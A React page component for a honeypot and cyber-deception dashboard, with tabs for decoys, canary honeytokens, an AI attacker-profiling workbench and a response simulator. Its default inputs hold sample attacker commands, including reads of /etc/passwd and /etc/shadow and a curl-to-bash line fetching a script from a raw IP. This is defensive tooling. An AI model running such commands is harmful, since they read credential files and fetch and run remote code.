import React, { useState, useEffect } from 'react';
import {
  ShieldCheck,
  Server,
  Key,
  Cpu,
  Clock,
  ArrowRight,
  Play,
  CheckCircle2,
  AlertTriangle,
  Code2,
  Terminal,
  Database,
  Globe,
  Radio,
  FileCode,
  Copy,
  Check,
  Zap,
  FlaskConical,
} from 'lucide-react';
import api from '../services/api';
import LoadingState from '../components/common/LoadingState';
import ErrorState from '../components/common/ErrorState';
import DeceptionLabView from '../components/deception/DeceptionLabView';

export default function DeceptionPage() {
  const [activeTab, setActiveTab] = useState('fleet'); // fleet | honeytokens | caronte | sandbox
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  // Fleet state
  const [fleetSummary, setFleetSummary] = useState(null);
  const [decoys, setDecoys] = useState([]);
  const [selectedDecoy, setSelectedDecoy] = useState(null);
  const [copiedYaml, setCopiedYaml] = useState(false);

  // Honeytoken state
  const [honeytokens, setHoneytokens] = useState([]);
  const [trippingToken, setTrippingToken] = useState(null);
  const [tripSuccess, setTripSuccess] = useState(null);

  // Caronte AI state
  const [caronteSessionId, setCaronteSessionId] = useState('sess-probe-live-01');
  const [caronteSourceIp, setCaronteSourceIp] = useState('198.51.100.42');
  const [caronteCommands, setCaronteCommands] = useState(
    'uname -a\nwhoami\ncat /etc/passwd\ncat /etc/shadow\ncurl -s http://194.26.29.112/bot.sh | bash'
  );
  const [caronteLoading, setCaronteLoading] = useState(false);
  const [caronteReport, setCaronteReport] = useState(null);

  // Sandbox state
  const [policies, setPolicies] = useState([]);
  const [matrix, setMatrix] = useState({});
  const [simCommand, setSimCommand] = useState('cat /etc/shadow');
  const [simIntent, setSimIntent] = useState('CREDENTIAL_ACCESS');
  const [simStage] = useState('CREDENTIAL_ACCESS');
  const [simRisk, setSimRisk] = useState(65);
  const [simResult, setSimResult] = useState(null);
  const [simulating, setSimulating] = useState(false);

  useEffect(() => {
    async function loadInitialData() {
      try {
        setLoading(true);
        const [summaryData, decoysData, tokensData, polData, matData] = await Promise.all([
          api.getFleetSummary().catch(() => null),
          api.getDecoys().catch(() => []),
          api.getHoneytokens().catch(() => []),
          api.getDeceptionPolicies().catch(() => []),
          api.getTransitionMatrix().catch(() => ({})),
        ]);

        setFleetSummary(
          summaryData || {
            total_decoys: 5,
            active_decoys: 5,
            total_interactions: 11625,
            total_honeytokens: 6,
            tripped_honeytokens: 4,
            protocols_supported: ['SSH', 'HTTP', 'TCP', 'TELNET', 'MCP'],
            runtime_engine: 'Beelzebub Decoy Runtime 2.4.0',
            zero_host_execution: true,
          }
        );
        setDecoys(decoysData || []);
        if (decoysData && decoysData.length > 0) {
          setSelectedDecoy(decoysData[0]);
        }
        setHoneytokens(tokensData || []);
        setPolicies(polData || []);
        setMatrix(matData || {});
      } catch (err) {
        console.warn('Deception data error:', err);
      } finally {
        setLoading(false);
      }
    }
    loadInitialData();
  }, []);

  const handleTripToken = async (tokenId) => {
    try {
      setTrippingToken(tokenId);
      const res = await api.tripHoneytoken(tokenId);
      setHoneytokens((prev) => prev.map((t) => (t.token_id === tokenId ? res : t)));
      setTripSuccess(`Canary ${tokenId} tripped! Instant critical security alert broadcasted.`);
      setTimeout(() => setTripSuccess(null), 4000);
    } catch (err) {
      alert(`Tripwire simulation failed: ${err.message}`);
    } finally {
      setTrippingToken(null);
    }
  };

  const handleRunCaronte = async (e) => {
    e.preventDefault();
    try {
      setCaronteLoading(true);
      const cmdList = caronteCommands.split('\n').map((c) => c.trim()).filter(Boolean);
      const res = await api.runCaronteInvestigation({
        session_id: caronteSessionId,
        source_ip: caronteSourceIp,
        commands: cmdList,
      });
      setCaronteReport(res);
    } catch (err) {
      alert(`Caronte AI analysis failed: ${err.message}`);
    } finally {
      setCaronteLoading(false);
    }
  };

  const handleSimulate = async (e) => {
    e.preventDefault();
    try {
      setSimulating(true);
      const res = await api.simulateDeception({
        command: simCommand,
        intent: simIntent,
        attack_stage: simStage,
        session_id: 'sim_interactive_console',
        risk_score: parseInt(simRisk, 10),
      });
      setSimResult(res);
    } catch (err) {
      alert(`Simulation failed: ${err.message}`);
    } finally {
      setSimulating(false);
    }
  };

  const copyYaml = (yaml) => {
    navigator.clipboard.writeText(yaml);
    setCopiedYaml(true);
    setTimeout(() => setCopiedYaml(false), 2000);
  };

  if (loading) return <LoadingState message="Connecting to Beelzebub Deception Fleet..." />;
  if (error) return <ErrorState message={error} />;

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4 border-b border-[#1f293d] pb-5">
        <div>
          <div className="flex items-center gap-2 text-xs font-mono text-cyan-400 mb-1">
            <Radio className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
            BEELZEBUB CLOUD DECEPTION RUNTIME
          </div>
          <h1 className="text-2xl font-bold tracking-tight text-slate-100 flex items-center gap-3">
            <ShieldCheck className="w-7 h-7 text-cyan-400" />
            Cyber Deception & Attacker Profiling Hub
          </h1>
          <p className="text-xs text-slate-400 mt-1">
            Low-interaction decoy services, canary honeytokens, Caronte AI threat analyst, and mathematically isolated responses.
          </p>
        </div>

        {/* Tab Navigation */}
        <div className="flex items-center gap-1.5 p-1 bg-[#0c101a] border border-[#1f293d] rounded-lg">
          {[
            { id: 'fleet', label: 'Decoy Fleet', icon: Server },
            { id: 'lab', label: 'Effectiveness Lab', icon: FlaskConical },
            { id: 'honeytokens', label: 'Honeytokens & Canaries', icon: Key },
            { id: 'caronte', label: 'Caronte AI Analyst', icon: Cpu },
            { id: 'sandbox', label: 'Adaptive Sandbox', icon: Terminal },
          ].map((tab) => {
            const Icon = tab.icon;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 px-3 py-1.5 rounded-md text-xs font-medium transition-colors ${
                  activeTab === tab.id
                    ? 'bg-cyan-950/60 text-cyan-400 border border-cyan-800/60 font-semibold'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-[#131b2e]'
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{tab.label}</span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Fleet Overview Stat Cards */}
      {fleetSummary && (
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-lg">
            <span className="text-[11px] font-mono text-slate-400 uppercase">Active Decoys</span>
            <div className="text-2xl font-bold font-mono text-cyan-400 mt-1">
              {fleetSummary.active_decoys} / {fleetSummary.total_decoys}
            </div>
            <span className="text-[10px] text-emerald-400 font-mono flex items-center gap-1 mt-1">
              <CheckCircle2 className="w-3 h-3" />
              100% Deployed
            </span>
          </div>

          <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-lg">
            <span className="text-[11px] font-mono text-slate-400 uppercase">Total Interactions</span>
            <div className="text-2xl font-bold font-mono text-slate-100 mt-1">
              {fleetSummary.total_interactions.toLocaleString()}
            </div>
            <span className="text-[10px] text-slate-400 font-mono mt-1 block">Captured Probes</span>
          </div>

          <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-lg">
            <span className="text-[11px] font-mono text-slate-400 uppercase">Honeytokens Tripped</span>
            <div className="text-2xl font-bold font-mono text-amber-400 mt-1">
              {fleetSummary.tripped_honeytokens} / {fleetSummary.total_honeytokens}
            </div>
            <span className="text-[10px] text-amber-400 font-mono mt-1 block">Active Tripwires</span>
          </div>

          <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-lg">
            <span className="text-[11px] font-mono text-slate-400 uppercase">Host Isolation</span>
            <div className="text-2xl font-bold font-mono text-emerald-400 mt-1">100% Zero-Exec</div>
            <span className="text-[10px] text-emerald-400 font-mono mt-1 block">Mathematical Sandbox</span>
          </div>
        </div>
      )}

      {/* TAB LAB: DECEPTION EFFECTIVENESS LAB */}
      {activeTab === 'lab' && <DeceptionLabView />}

      {/* TAB 1: DECOY FLEET */}
      {activeTab === 'fleet' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Decoy List */}
          <div className="lg:col-span-6 space-y-3">
            <h2 className="text-sm font-semibold text-slate-200 uppercase tracking-wider flex items-center gap-2">
              <Server className="w-4 h-4 text-cyan-400" />
              Active Beelzebub Decoy Services ({decoys.length})
            </h2>

            {decoys.map((decoy) => (
              <div
                key={decoy.decoy_id}
                onClick={() => setSelectedDecoy(decoy)}
                className={`p-4 rounded-lg border cursor-pointer transition-all ${
                  selectedDecoy?.decoy_id === decoy.decoy_id
                    ? 'bg-[#151f33] border-cyan-500/80 shadow-lg shadow-cyan-950/30'
                    : 'bg-[#111726] border-[#1f293d] hover:border-slate-600'
                }`}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2.5">
                    <span className="px-2 py-0.5 text-[10px] font-mono font-bold rounded bg-cyan-950 text-cyan-400 border border-cyan-800/60">
                      {decoy.protocol}
                    </span>
                    <h3 className="text-sm font-semibold text-slate-100">{decoy.name}</h3>
                  </div>
                  <span className="px-2 py-0.5 text-[10px] font-mono font-semibold rounded bg-emerald-950/60 text-emerald-400 border border-emerald-800/40">
                    PORT {decoy.port}
                  </span>
                </div>

                <p className="text-xs text-slate-400 mt-2 line-clamp-2">{decoy.description}</p>

                <div className="mt-3 pt-3 border-t border-[#1f293d]/80 flex items-center justify-between text-[11px] font-mono text-slate-400">
                  <span>Engine: {decoy.emulation_engine}</span>
                  <span className="text-cyan-400">{decoy.interactions_count} hits</span>
                </div>
              </div>
            ))}
          </div>

          {/* Low-Code YAML Decoy Viewer */}
          <div className="lg:col-span-6">
            <div className="bg-[#0e1422] border border-[#1f293d] rounded-lg p-5 sticky top-6">
              <div className="flex items-center justify-between pb-3 border-b border-[#1f293d] mb-4">
                <div>
                  <h3 className="text-sm font-semibold text-slate-100 flex items-center gap-2">
                    <FileCode className="w-4 h-4 text-cyan-400" />
                    Low-Code Decoy Specification (YAML)
                  </h3>
                  <p className="text-[11px] text-slate-400 font-mono mt-0.5">
                    {selectedDecoy?.decoy_id} &bull; {selectedDecoy?.name}
                  </p>
                </div>

                <button
                  onClick={() => selectedDecoy && copyYaml(selectedDecoy.yaml_config)}
                  className="flex items-center gap-1.5 px-2.5 py-1 text-xs font-mono bg-[#19243b] hover:bg-[#223150] text-slate-200 rounded border border-[#2b3c61] transition-colors"
                >
                  {copiedYaml ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copiedYaml ? 'Copied' : 'Copy YAML'}</span>
                </button>
              </div>

              {selectedDecoy ? (
                <div className="relative">
                  <pre className="p-4 bg-[#080c14] border border-[#1b2538] rounded-md font-mono text-xs text-cyan-300 overflow-x-auto max-h-[500px]">
                    {selectedDecoy.yaml_config}
                  </pre>
                </div>
              ) : (
                <div className="p-8 text-center text-xs text-slate-500">Select a decoy to inspect its YAML configuration.</div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: HONEYTOKENS & CANARIES */}
      {activeTab === 'honeytokens' && (
        <div className="space-y-4">
          {tripSuccess && (
            <div className="p-3 bg-red-950/40 border border-red-800/60 rounded-md text-xs font-mono text-red-300 flex items-center gap-2">
              <AlertTriangle className="w-4 h-4 text-red-400" />
              <span>{tripSuccess}</span>
            </div>
          )}

          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-sm font-semibold text-slate-200 uppercase tracking-wider flex items-center gap-2">
                <Key className="w-4 h-4 text-cyan-400" />
                Deployed Honeytokens & Canary Credentials ({honeytokens.length})
              </h2>
              <p className="text-xs text-slate-400 mt-0.5">
                Canary credentials intentionally seeded inside decoys. Any usage confirms adversary compromise with zero false positives.
              </p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {honeytokens.map((token) => (
              <div
                key={token.token_id}
                className="p-4 bg-[#111726] border border-[#1f293d] rounded-lg flex flex-col justify-between hover:border-slate-600 transition-colors"
              >
                <div>
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-[#17223b] text-cyan-400 font-semibold border border-cyan-800/40">
                      {token.token_type}
                    </span>
                    <span
                      className={`text-[10px] font-mono px-2 py-0.5 rounded ${
                        token.tripped
                          ? 'bg-red-950/60 text-red-400 border border-red-800/40'
                          : 'bg-emerald-950/60 text-emerald-400 border border-emerald-800/40'
                      }`}
                    >
                      {token.tripped ? `TRIPPED (${token.trip_count})` : 'ARMED'}
                    </span>
                  </div>

                  <h3 className="text-sm font-semibold text-slate-100 mt-2.5">{token.label}</h3>
                  <div className="mt-2 p-2 bg-[#0a0f19] border border-[#1b2538] rounded font-mono text-[11px] text-slate-300 break-all">
                    {token.sample_value}
                  </div>

                  <div className="mt-3 space-y-1 text-xs text-slate-400">
                    <div>
                      <span className="text-slate-500">Location:</span> {token.deployed_environment}
                    </div>
                    <div>
                      <span className="text-slate-500">MITRE:</span> {token.mitre_technique}
                    </div>
                  </div>
                </div>

                <div className="mt-4 pt-3 border-t border-[#1f293d] flex items-center justify-between">
                  <span className="text-[10px] font-mono text-slate-500">Decoy: {token.associated_decoy_id}</span>
                  <button
                    onClick={() => handleTripToken(token.token_id)}
                    disabled={trippingToken === token.token_id}
                    className="px-2.5 py-1 text-xs font-mono bg-red-950/40 hover:bg-red-900/60 text-red-300 border border-red-800/50 rounded transition-colors"
                  >
                    {trippingToken === token.token_id ? 'Simulating Trip...' : 'Test Tripwire'}
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* TAB 3: CARONTE AI THREAT ANALYST */}
      {activeTab === 'caronte' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Investigation Inputs */}
          <div className="lg:col-span-5 space-y-4">
            <div className="p-5 bg-[#111726] border border-[#1f293d] rounded-lg">
              <div className="flex items-center gap-2 pb-3 border-b border-[#1f293d] mb-4">
                <Cpu className="w-5 h-5 text-cyan-400" />
                <div>
                  <h3 className="text-sm font-semibold text-slate-100">Caronte AI Forensic Workbench</h3>
                  <p className="text-[11px] text-slate-400 font-mono">Autonomous Honeypot Investigation Engine</p>
                </div>
              </div>

              <form onSubmit={handleRunCaronte} className="space-y-4">
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">Subject Attacker IP</label>
                  <input
                    type="text"
                    value={caronteSourceIp}
                    onChange={(e) => setCaronteSourceIp(e.target.value)}
                    className="w-full bg-[#0a0f19] border border-[#1f293d] rounded px-3 py-1.5 text-xs font-mono text-slate-200 focus:outline-none focus:border-cyan-500"
                  />
                </div>

                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">Session Identifier</label>
                  <input
                    type="text"
                    value={caronteSessionId}
                    onChange={(e) => setCaronteSessionId(e.target.value)}
                    className="w-full bg-[#0a0f19] border border-[#1f293d] rounded px-3 py-1.5 text-xs font-mono text-slate-200 focus:outline-none focus:border-cyan-500"
                  />
                </div>

                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Chronological Attacker Commands (one per line)
                  </label>
                  <textarea
                    rows={6}
                    value={caronteCommands}
                    onChange={(e) => setCaronteCommands(e.target.value)}
                    className="w-full bg-[#0a0f19] border border-[#1f293d] rounded p-3 text-xs font-mono text-cyan-300 focus:outline-none focus:border-cyan-500"
                  />
                </div>

                <button
                  type="submit"
                  disabled={caronteLoading}
                  className="w-full py-2 px-4 rounded bg-cyan-600 hover:bg-cyan-500 text-slate-900 font-semibold text-xs flex items-center justify-center gap-2 transition-colors"
                >
                  <Play className="w-3.5 h-3.5 fill-current" />
                  <span>{caronteLoading ? 'Executing Caronte Forensic AI...' : 'Run Caronte AI Threat Analysis'}</span>
                </button>
              </form>
            </div>
          </div>

          {/* Investigation Results / Dossier */}
          <div className="lg:col-span-7">
            {caronteReport ? (
              <div className="space-y-4">
                {/* Dossier Header */}
                <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-lg">
                  <div className="flex items-center justify-between pb-3 border-b border-[#1f293d]">
                    <div>
                      <span className="text-[10px] font-mono text-cyan-400 font-bold uppercase">
                        Investigation ID: {caronteReport.investigation_id}
                      </span>
                      <h3 className="text-base font-bold text-slate-100 mt-0.5">
                        Attacker Sophistication: {caronteReport.attacker_sophistication}
                      </h3>
                    </div>
                    <div className="text-right">
                      <span className="text-xs font-mono text-emerald-400 font-bold">
                        {caronteReport.deception_containment_score}% Contained
                      </span>
                      <div className="text-[10px] text-slate-500 font-mono">
                        +{caronteReport.tar_pit_delay_imposed_seconds}s Tar-Pit Latency
                      </div>
                    </div>
                  </div>

                  <p className="text-xs text-slate-300 mt-2.5 leading-relaxed">
                    {caronteReport.sophistication_rationale}
                  </p>

                  <div className="mt-3 flex items-center gap-2 text-xs font-mono text-cyan-300">
                    <span className="text-slate-400">Intent Sequence:</span>
                    {caronteReport.intent_progression.join(' ➔ ')}
                  </div>
                </div>

                {/* MITRE ATT&CK Matrix Alignment */}
                <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-lg">
                  <h4 className="text-xs font-semibold text-slate-200 uppercase tracking-wider mb-3">
                    MITRE ATT&CK Matrix Mapping
                  </h4>
                  <div className="space-y-2">
                    {caronteReport.mitre_attack_mappings.map((m, idx) => (
                      <div
                        key={idx}
                        className="p-2.5 bg-[#0a0f19] border border-[#1b2538] rounded flex items-center justify-between text-xs"
                      >
                        <div className="flex items-center gap-2">
                          <span className="px-1.5 py-0.5 rounded bg-cyan-950 text-cyan-400 font-mono text-[10px]">
                            {m.technique_id}
                          </span>
                          <span className="font-semibold text-slate-200">{m.name}</span>
                          <span className="text-slate-500 font-mono text-[11px]">({m.tactic})</span>
                        </div>
                        <span className="text-emerald-400 font-mono text-[11px] font-semibold">
                          {Math.round(m.confidence * 100)}% Match
                        </span>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Extracted IOCs & Recommendations */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-lg">
                    <h4 className="text-xs font-semibold text-slate-200 uppercase tracking-wider mb-2">
                      Extracted IOCs
                    </h4>
                    <div className="space-y-1.5 text-xs font-mono text-slate-300">
                      <div>
                        <span className="text-slate-500">Payload URLs:</span>{' '}
                        {caronteReport.extracted_iocs.download_urls.length > 0
                          ? caronteReport.extracted_iocs.download_urls.join(', ')
                          : 'None'}
                      </div>
                      <div>
                        <span className="text-slate-500">Credential Targets:</span>{' '}
                        {caronteReport.extracted_iocs.credential_targets.join(', ')}
                      </div>
                    </div>
                  </div>

                  <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-lg">
                    <h4 className="text-xs font-semibold text-slate-200 uppercase tracking-wider mb-2">
                      Recommended Countermeasures
                    </h4>
                    <ul className="list-disc pl-4 text-xs text-slate-300 space-y-1">
                      {caronteReport.recommended_countermeasures.slice(0, 3).map((r, i) => (
                        <li key={i}>{r}</li>
                      ))}
                    </ul>
                  </div>
                </div>
              </div>
            ) : (
              <div className="p-12 text-center bg-[#0d121d] border border-dashed border-[#1f293d] rounded-lg text-slate-500 text-xs">
                Enter attacker commands on the left and click "Run Caronte AI Threat Analysis" to synthesize an autonomous forensic dossier.
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 4: ADAPTIVE SANDBOX */}
      {activeTab === 'sandbox' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Simulator Form */}
          <div className="lg:col-span-5 space-y-4">
            <div className="p-5 bg-[#111726] border border-[#1f293d] rounded-lg">
              <h3 className="text-sm font-semibold text-slate-100 flex items-center gap-2 mb-3">
                <Terminal className="w-4 h-4 text-cyan-400" />
                Safe Deception Response Synthesizer
              </h3>

              <form onSubmit={handleSimulate} className="space-y-3">
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">Command String</label>
                  <input
                    type="text"
                    value={simCommand}
                    onChange={(e) => setSimCommand(e.target.value)}
                    className="w-full bg-[#0a0f19] border border-[#1f293d] rounded px-3 py-1.5 text-xs font-mono text-cyan-300 focus:outline-none focus:border-cyan-500"
                  />
                </div>

                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">Trigger Intent</label>
                  <select
                    value={simIntent}
                    onChange={(e) => setSimIntent(e.target.value)}
                    className="w-full bg-[#0a0f19] border border-[#1f293d] rounded px-3 py-1.5 text-xs font-mono text-slate-200 focus:outline-none focus:border-cyan-500"
                  >
                    <option value="RECONNAISSANCE">RECONNAISSANCE</option>
                    <option value="DISCOVERY">DISCOVERY</option>
                    <option value="CREDENTIAL_ACCESS">CREDENTIAL_ACCESS</option>
                    <option value="EXECUTION">EXECUTION</option>
                    <option value="EXPLOITATION">EXPLOITATION</option>
                    <option value="OTHER">OTHER</option>
                  </select>
                </div>

                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Session Risk Score: {simRisk}
                  </label>
                  <input
                    type="range"
                    min="0"
                    max="100"
                    value={simRisk}
                    onChange={(e) => setSimRisk(e.target.value)}
                    className="w-full accent-cyan-400"
                  />
                </div>

                <button
                  type="submit"
                  disabled={simulating}
                  className="w-full py-2 px-4 rounded bg-cyan-600 hover:bg-cyan-500 text-slate-900 font-semibold text-xs flex items-center justify-center gap-2 transition-colors"
                >
                  <Play className="w-3.5 h-3.5 fill-current" />
                  <span>{simulating ? 'Synthesizing...' : 'Simulate Deception Response'}</span>
                </button>
              </form>
            </div>
          </div>

          {/* Simulation Output */}
          <div className="lg:col-span-7">
            {simResult ? (
              <div className="p-5 bg-[#111726] border border-[#1f293d] rounded-lg space-y-3">
                <div className="flex items-center justify-between pb-3 border-b border-[#1f293d]">
                  <span className="px-2 py-0.5 text-[10px] font-mono font-bold rounded bg-cyan-950 text-cyan-400 border border-cyan-800/60">
                    STRATEGY: {simResult.strategy}
                  </span>
                  <span className="text-xs font-mono text-amber-400">
                    Delay: {simResult.delay_ms}ms (Tar-Pit Applied)
                  </span>
                </div>

                <div className="font-mono text-xs">
                  <div className="text-slate-500 mb-1">// Emulated Honeypot Shell Feedback (Zero Host Execution)</div>
                  <pre className="p-3 bg-[#0a0f19] border border-[#1b2538] rounded text-emerald-300 overflow-x-auto whitespace-pre-wrap">
                    {simResult.decoy_payload}
                  </pre>
                </div>

                {simResult.honeytokens_injected?.length > 0 && (
                  <div>
                    <span className="text-xs font-medium text-slate-300">Injected Canary Honeytokens:</span>
                    <div className="mt-1 flex flex-wrap gap-1.5">
                      {simResult.honeytokens_injected.map((token, i) => (
                        <span
                          key={i}
                          className="px-2 py-0.5 text-[11px] font-mono bg-amber-950/40 text-amber-300 border border-amber-800/40 rounded"
                        >
                          {token}
                        </span>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            ) : (
              <div className="p-12 text-center bg-[#0d121d] border border-dashed border-[#1f293d] rounded-lg text-slate-500 text-xs">
                Select an intent and command to simulate safe adaptive deception output.
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
